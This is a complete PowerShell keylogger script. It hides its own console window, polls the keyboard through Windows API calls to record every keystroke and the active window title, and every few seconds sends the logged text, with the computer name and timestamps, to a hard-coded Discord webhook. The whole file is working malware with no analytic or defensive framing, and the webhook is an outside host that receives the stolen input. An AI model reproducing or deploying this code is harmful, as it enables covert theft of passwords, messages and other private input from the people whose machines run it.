$h2=0
$e1=@{}
$f5=@{Ctrl=17;Shift=16;Alt=18;Win=91;WinRight=92}
$g8=@(3447003,15844367,3066993,15105570,10181046,9807270,15277667,1146986,2067276,2123412)
$d4=[TimeSpan]::FromSeconds(10)
$c9=[System.Diagnostics.Stopwatch]::StartNew()
$o1=@'
[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
[DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
'@
$p6=Add-Type -MemberDefinition $o1 -Name Win32HideWindow -Namespace Win32Functions -PassThru
$q2=(Get-Process -PID $pid).MainWindowHandle
if($q2 -ne [IntPtr]::Zero){
    $p6::ShowWindowAsync($q2,0)
    $r8=-20
    $s4=0x00000080
    $t0=$p6::GetWindowLong($q2,$r8)
    $p6::SetWindowLong($q2,$r8,$t0 -bor $s4)
} else {
    $Host.UI.RawUI.WindowTitle='xx'
    $u5=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
    if($u5) {
        $q2=$u5.MainWindowHandle
        $p6::ShowWindowAsync($q2,0)
        $t0=$p6::GetWindowLong($q2,-20)
        $p6::SetWindowLong($q2,-20,$t0 -bor 0x00000080)
    }
}
$b3=@'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]
public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int ProcessId);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
'@
$b3=Add-Type -MemberDefinition $b3 -Name 'Win32' -Namespace API -PassThru
$a7="https://discordapp.com/api/webhooks/1442666713748476014/wiZuG-6nKMfeW4oEPmQEW3vAzWOXU876iVErkWnGJ29lhWrR3BbSXCL0CMs0tC16voAv"
function Get-ActiveWindowInfo {
    try {
        $i6=$b3::GetForegroundWindow()
        if ($i6 -ne [IntPtr]::Zero) {
            $j0=0
            $b3::GetWindowThreadProcessId($i6,[ref]$j0)
            if ($j0 -gt 0) {
                $k7=Get-Process -Id $j0 -ErrorAction SilentlyContinue
                $l3=if($k7){$k7.ProcessName}else{"Unknown"}
                $m9=New-Object System.Text.StringBuilder 256
                $b3::GetWindowText($i6,$m9,256)
                $n5=$m9.ToString()
                return @{ProcessName=$l3;WindowTitle=$n5}
            }
        }
    } catch {}
    return @{ProcessName="Unknown";WindowTitle=""}
}
$send=""
While ($true){
  $v1=$false
    try{
      while ($c9.Elapsed -lt $d4) {
      Sleep -M 5
        $w7=($b3::GetAsyncKeyState($f5.Ctrl) -lt 0)
        $x3=($b3::GetAsyncKeyState($f5.Shift) -lt 0)
        $y9=($b3::GetAsyncKeyState($f5.Alt) -lt 0)
        $z5=(($b3::GetAsyncKeyState($f5.Win) -lt 0) -or ($b3::GetAsyncKeyState($f5.WinRight) -lt 0))
        for ($a0=8; $a0 -le 254; $a0++){
        $b6=$b3::GetAsyncKeyState($a0)
          if ($b6 -eq -32767) {
                if (-not $e1.ContainsKey($a0)) {
                    $v1=$true
                    $c9.Restart()
                    $null=[console]::CapsLock
                    $c2=$b3::MapVirtualKey($a0,3)
                    $d8=New-Object Byte[] 256
                    $e4=$b3::GetKeyboardState($d8)
                $f0=New-Object -TypeName System.Text.StringBuilder
                $g6=""
                $h3=$false
                $i8=$false
                if ($a0 -eq 16 -or $a0 -eq 17 -or $a0 -eq 18 -or $a0 -eq 91 -or $a0 -eq 92) {
                    $h3=$true
                    if ($a0 -eq 91 -or $a0 -eq 92) {
                        $i8=$true
                    }
                }
                if($a0 -eq 8){$g6="[BACK]"}elseif($a0 -eq 33){$g6="[PGUP]"}elseif($a0 -eq 91){$g6="[WIN]"}elseif($a0 -eq 112){$g6="[F1]"}elseif($a0 -eq 9){$g6="[TAB]"}elseif($a0 -eq 34){$g6="[PGDN]"}elseif($a0 -eq 37){$g6="[LEFT]"}elseif($a0 -eq 115){$g6="[F4]"}elseif($a0 -eq 13){$g6="[ENT]"}elseif($a0 -eq 35){$g6="[END]"}elseif($a0 -eq 92){$g6="[RWIN]"}elseif($a0 -eq 113){$g6="[F2]"}elseif($a0 -eq 27){$g6="[ESC]"}elseif($a0 -eq 36){$g6="[HOME]"}elseif($a0 -eq 45){$g6="[INS]"}elseif($a0 -eq 116){$g6="[F5]"}elseif($a0 -eq 32){$g6=" "}elseif($a0 -eq 38){$g6="[UP]"}elseif($a0 -eq 39){$g6="[RIGHT]"}elseif($a0 -eq 117){$g6="[F6]"}elseif($a0 -eq 16){$g6="[SHIFT]"}elseif($a0 -eq 40){$g6="[DOWN]"}elseif($a0 -eq 93){$g6="[MENU]"}elseif($a0 -eq 114){$g6="[F3]"}elseif($a0 -eq 17){$g6="[CTRL]"}elseif($a0 -eq 46){$g6="[DEL]"}elseif($a0 -eq 118){$g6="[F7]"}elseif($a0 -eq 18){$g6="[ALT]"}elseif($a0 -eq 119){$g6="[F8]"}elseif($a0 -eq 120){$g6="[F9]"}elseif($a0 -eq 160){$g6="[LSHIFT]"}elseif($a0 -eq 121){$g6="[F10]"}elseif($a0 -eq 122){$g6="[F11]"}elseif($a0 -eq 161){$g6="[RSHIFT]"}elseif($a0 -eq 123){$g6="[F12]"}elseif($a0 -eq 124){$g6="[F13]"}elseif($a0 -eq 162){$g6="[LCTRL]"}elseif($a0 -eq 125){$g6="[F14]"}elseif($a0 -eq 126){$g6="[F15]"}elseif($a0 -eq 163){$g6="[RCTRL]"}elseif($a0 -eq 127){$g6="[F16]"}elseif($a0 -eq 128){$g6="[F17]"}elseif($a0 -eq 164){$g6="[LALT]"}elseif($a0 -eq 129){$g6="[F18]"}elseif($a0 -eq 130){$g6="[F19]"}elseif($a0 -eq 165){$g6="[RALT]"}elseif($a0 -eq 131){$g6="[F20]"}elseif($a0 -eq 132){$g6="[F21]"}elseif($a0 -eq 20){$g6="[CAPS]"}elseif($a0 -eq 133){$g6="[F22]"}elseif($a0 -eq 134){$g6="[F23]"}elseif($a0 -eq 135){$g6="[F24]"}elseif($a0 -eq 144){$g6="[NUMLOCK]"}elseif($a0 -eq 96){$g6="[NUM0]"}elseif($a0 -eq 97){$g6="[NUM1]"}elseif($a0 -eq 145){$g6="[SCROLL]"}elseif($a0 -eq 98){$g6="[NUM2]"}elseif($a0 -eq 99){$g6="[NUM3]"}elseif($a0 -eq 100){$g6="[NUM4]"}elseif($a0 -eq 101){$g6="[NUM5]"}elseif($a0 -eq 102){$g6="[NUM6]"}elseif($a0 -eq 103){$g6="[NUM7]"}elseif($a0 -eq 104){$g6="[NUM8]"}elseif($a0 -eq 105){$g6="[NUM9]"}elseif($a0 -eq 106){$g6="[NUM*]"}elseif($a0 -eq 107){$g6="[NUM+]"}elseif($a0 -eq 108){$g6="[NUMENT]"}elseif($a0 -eq 109){$g6="[NUM-]"}elseif($a0 -eq 110){$g6="[NUM.]"}elseif($a0 -eq 111){$g6="[NUM/]"}elseif($a0 -eq 186){$g6=";"}elseif($a0 -eq 187){$g6="="}elseif($a0 -eq 188){$g6=","}elseif($a0 -eq 189){$g6="-"}elseif($a0 -eq 190){$g6="."}elseif($a0 -eq 191){$g6="/"}elseif($a0 -eq 192){$g6="``"}elseif($a0 -eq 219){$g6="["}elseif($a0 -eq 220){$g6="\"}elseif($a0 -eq 221){$g6="]"}elseif($a0 -eq 222){$g6="'"}elseif($a0 -eq 44){$g6="[PRTSC]"}elseif($a0 -eq 19){$g6="[PAUSE]"}elseif($a0 -eq 173){$g6="[VOLMUTE]"}elseif($a0 -eq 174){$g6="[VOLDN]"}elseif($a0 -eq 175){$g6="[VOLUP]"}elseif($a0 -eq 176){$g6="[NEXT]"}elseif($a0 -eq 177){$g6="[PREV]"}elseif($a0 -eq 178){$g6="[STOP]"}elseif($a0 -eq 179){$g6="[PLAY]"}elseif($a0 -eq 166){$g6="[BROWSERBACK]"}elseif($a0 -eq 167){$g6="[BROWSERFORWARD]"}elseif($a0 -eq 168){$g6="[BROWSERREFRESH]"}elseif($a0 -eq 169){$g6="[BROWSERSTOP]"}elseif($a0 -eq 170){$g6="[BROWSERSEARCH]"}elseif($a0 -eq 171){$g6="[BROWSERFAVORITES]"}elseif($a0 -eq 172){$g6="[BROWSERHOME]"}elseif($a0 -eq 182){$g6="[CALC]"}elseif($a0 -eq 183){$g6="[MAIL]"}elseif($a0 -eq 180){$g6="[MEDIASELECT]"}else{
                    if ($b3::ToUnicode($a0,$c2,$d8,$f0,$f0.Capacity,0)) {
                        $g6=$f0.ToString()
                    } else {
                        $g6="[KEY"+$a0+"]"
                    }
                }
          if ($g6 -ne "") {
    # Skip adding raw modifier keys to output - they're handled in combos
    if (-not $h3) {
        $j4 = $w7 -or $x3 -or $y9 -or $z5
        $k0 = $false
        if ($j4) {
            $k0 = $true
        }
        if ($k0) {
            $l6 = @()
            if ($w7) { $l6 += "CTRL" }
            if ($x3) { $l6 += "SHIFT" }
            if ($y9) { $l6 += "ALT" }
            if ($z5) { $l6 += "WIN" }
            $m2 = ($l6 -join "+")
            $send += "[" + $m2 + "+" + $g6 + "]"
        } else {
            $send += $g6
        }
    }
    $e1[$a0] = $true
}
                }
          } else {
                if ($b6 -ge 0 -and $e1.ContainsKey($a0)) {
                    $e1.Remove($a0)
                }
          }
        }
      }
    }
    finally{
      If ($v1) {
      $n8=$send
      $o4=$n8 -replace '(\[[A-Z0-9]+\])', ' $1 '
      $o4=$o4 -replace '\s+', ' '
      $o4=$o4.Trim()
      $p0=""
      $q6=0
      while ($q6 -lt $n8.Length) {
        if ($n8.Substring($q6).StartsWith("[BACK]")) {
          if ($p0.Length -gt 0) {
            $p0=$p0.Substring(0,$p0.Length-1)
          }
          $q6+=6
        } elseif ($n8.Substring($q6).StartsWith("[DEL]")) {
          $q6+=5
        } elseif ($n8.Substring($q6).StartsWith("[")) {
          $r2=$n8.IndexOf("]",$q6)
          if ($r2 -ge 0) {
            $q6=$r2+1
          } else {
            $q6++
          }
        } else {
          $p0+=$n8[$q6]
          $q6++
        }
      }
      $p0=$p0.Trim()
      if ($o4.Length -gt 1900) {
        $o4=$o4.Substring(0,1900)+"..."
      }
      if ($p0.Length -gt 1900) {
        $p0=$p0.Substring(0,1900)+"..."
      }
      $s8=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
      $t4=$env:COMPUTERNAME
      $u0=Get-Date -Format "HH:mm:ss"
      $v6=Get-Date -Format "MM/dd/yyyy"
      $w2=Get-ActiveWindowInfo
      $x8=$w2.ProcessName
      $y4=$w2.WindowTitle
      $z0=$p0.Length
      $a4=$o4.Length
      $b0=([regex]::Matches($o4,'\[BACK\]')).Count
      $c6=([regex]::Matches($o4,'\[[A-Z0-9]+\]')).Count
      $d2=$t4+" | "+$v6+" "+$u0
      $e8=$g8[$h2 % $g8.Length]
      $h2++
      $f4='```javascript'
      $g0='```'
      $h6=$f4+"`n"+$p0+"`n"+$g0
      $i2=$f4+"`n"+$o4+"`n"+$g0
      if ($h6.Length -gt 1020) {
        $h6=$f4+"`n"+$p0.Substring(0,1000)+"...`n"+$g0
      }
      if ($i2.Length -gt 1020) {
        $i2=$f4+"`n"+$o4.Substring(0,1000)+"...`n"+$g0
      }
      $j8="Process: **"+$x8+"**"
      if ($y4 -and $y4.Length -gt 0) {
        $j8+="`nWindow: "+$y4
      }
      $k4=@{
        title="Keystroke Log"
        description="**Session Data** | **Stats Below**"
        color=$e8
        timestamp=$s8
        fields=@(
          @{name="Application";value=$j8;inline=$true},
          @{name="Processed Text";value=$h6;inline=$false},
          @{name="Raw Data";value=$i2;inline=$false},
          @{name="Statistics";value="Clean: "+$z0+" chars`nRaw: "+$a4+" chars`nBackspaces: "+$b0+"`nSpecial Keys: "+$c6;inline=$true}
        )
        footer=@{text=$d2}
      }
      $l0=@{embeds=@($k4)}
      $m6=$l0|ConvertTo-Json -Depth 10 -Compress
      Invoke-RestMethod -Uri $a7 -Method Post -ContentType "application/json" -Body $m6
      $send=""
      $v1=$false
      $e1.Clear()
      }
    }
  $c9.Restart()
  Sleep -M 10
}
